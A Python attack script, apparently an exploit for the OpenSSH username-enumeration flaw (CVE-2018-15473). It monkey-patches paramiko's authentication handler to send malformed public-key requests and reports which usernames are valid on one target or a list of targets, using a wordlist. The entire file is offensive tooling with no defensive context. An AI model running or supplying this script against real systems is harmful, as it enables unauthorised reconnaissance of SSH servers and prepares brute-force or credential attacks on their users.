#!/usr/bin/python3

import argparse
import logging
import paramiko
import socket
import sys
import pdb


arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t',dest='hostname', type=str, help='Single target')
arg_parser.add_argument('-p',dest='port', type=int, default=22, help='port to connect on: Default port is 22')
arg_parser.add_argument('-u',dest='username', type=str, help='username you want to enumerate')
arg_parser.add_argument('-l',dest='Target_List', help='multiple targets to enumerate over')
arg_parser.add_argument('-w',dest='wordlist', help='enumerate multiple users')
args = arg_parser.parse_args()
port = args.port

class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


def ssh_sock(target, username, *args, **kwargs):
    with socket.socket() as sock:
        try:
            sock.connect((target, port))
        except socket.error:
            print ('[-] Failed to connect')
            sock.close()
            return

        transport = paramiko.transport.Transport(sock)
        
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print ('[-] Failed to negotiate SSH transport')
            return
        except EOFError:
            print("EOFError encountered with host: {}".format(target))
            return

        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        except InvalidUsername:
            print ('[*] {} - Invalid username'.format(username))
        except paramiko.ssh_exception.AuthenticationException:
            print ('[+] {} - Valid username'.format(username))
            return


paramiko.auth_handler.AuthHandler._handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

if args.username is not None:
    username = args.username
    if args.hostname is not None:
        target = args.hostname
        ssh_sock(target, username)
    elif args.Target_List is not None:
        with open(args.Target_List) as f:
            for target in f:
                ssh_sock(target, username)
if args.wordlist is not None:
    with open(args.wordlist) as w:
        for user in w:
            if args.hostname is not None:
                target = args.hostname
                ssh_sock(target, user.rstrip('\n'))
            elif args.Target_List is not None:
                with open(args.Target_List) as f:
                    for target in f:
                        ssh_sock(target, user)